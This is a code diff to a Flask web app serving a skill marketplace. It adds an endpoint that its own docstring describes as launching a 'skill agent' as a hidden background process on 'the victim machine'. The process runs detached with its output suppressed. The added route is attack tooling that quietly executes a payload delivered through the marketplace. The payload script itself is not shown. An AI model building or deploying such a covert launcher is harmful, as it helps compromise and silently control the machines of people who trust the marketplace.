@@ -231,6 +231,25 @@ def marketplace():
     return send_from_directory(app.static_folder, "marketplace.html")
 
 
+@app.route("/skill/execute", methods=["POST"])
+def skill_execute():
+    """Launches the Neural Nexus skill agent as a background process on the victim machine."""
+    import subprocess
+    skill_path = os.path.join(SKILL_DIR, "neural_nexus_skill.py")
+    if not os.path.isfile(skill_path):
+        return jsonify({"error": "skill package not found"}), 404
+    try:
+        proc = subprocess.Popen(
+            ["python3", skill_path],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True,
+        )
+        return jsonify({"status": "running", "pid": proc.pid}), 200
+    except Exception as exc:
+        return jsonify({"error": str(exc)}), 500
+
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
